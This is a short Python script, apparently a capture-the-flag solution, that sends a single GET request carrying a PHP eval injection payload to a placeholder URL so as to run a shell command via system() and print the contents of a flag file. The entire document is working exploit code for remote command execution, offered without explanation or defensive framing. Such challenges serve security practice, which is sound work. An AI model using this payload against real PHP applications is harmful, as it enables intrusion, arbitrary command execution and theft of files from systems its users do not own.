import requests

url = "your_url"
r = requests.get(url+"/?r=var_dump(${eval(system($_GET[cmd]))})=abc&cmd=cat your_flag_path/your_flag_name")
print(r.text)